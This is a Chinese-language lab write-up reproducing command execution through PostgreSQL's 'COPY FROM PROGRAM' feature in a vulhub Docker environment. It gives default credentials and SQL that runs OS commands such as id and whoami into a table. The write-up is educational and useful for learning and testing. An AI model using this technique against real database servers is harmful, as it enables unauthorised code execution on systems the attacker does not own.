## 0X00漏洞描述

PostgreSQL是一个功能强大对象关系数据库管理系统(ORDBMS)。由于9.3增加一个“COPY TO/FROM
PROGRAM”功能。这个功能就是允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令

从9.3 版本开始，PostgreSQL实现了“COPY TO/FROM
PROGRAM”这个新的功能，它允许数据库的超级用户以及“pg_read_server_files”组用户执行任意的操作系统命令。这意味着在数据库超级用户角色与运行此数据库的操作系统用户角色之间没有进行适当的权限的分离。

由于这个漏洞介于权限提升和任意代码执行之间，它需要一些前提权限，这些权限可以是通过认证正常的登录PostgreSQL也可以是通过SQL注入获得与PostgreSQL交互的途径。需要再一次说明的是，上述两种情形下都需要用户是一个超级用户或者是“pg_read_server_files”组用户。

## 0x01影响版本

9.3-11.2

## 0x02环境搭建

vulhub下载地址：https://github.com/vulhub/vulhub

启动存在漏洞的环境：`docker-compose up -d`

## 0x03漏洞复现

启动环境后，使用工具进行连接或者用其他方法，这里我用的`Navicat`数据库初始账号密码为`postgres/postgres`

![image-20210918112340819](https://image.3001.net/images/20211013/1634113196_616696ac2cff7c1d20236.png!small)

### 执行删除想保存命令但是存在的表

    
    
    DROP TABLE IF EXISTS cmd_exec;
    

![image-20210918112557185](https://image.3001.net/images/20211013/1634113196_616696acdac57bcc01775.png!small)

### 创建保存命令的表

    
    
    CREATE TABLE cmd_exec(cmd_output text);
    

![image-20210918112633968](https://image.3001.net/images/20211013/1634113197_616696ad67e2a26732830.png!small)

### 执行系统命令

这里主要通过`COPY FROM PROGRAM`

    
    
    COPY cmd_exec FROM PROGRAM 'id';
    

![image-20210918112732332](https://image.3001.net/images/20211013/1634113198_616696ae2162741e10a22.png!small)

查询该表

![image-20210918112800373](https://image.3001.net/images/20211013/1634113198_616696aea07b5aca7b6ff.png!small)

执行``whoami`

![image-20210918112830920](https://image.3001.net/images/20211013/1634113199_616696af334d2bb78c22a.png!small)

![image-20210918112848438](https://image.3001.net/images/20211013/1634113199_616696afbf8349fe98e50.png!small)

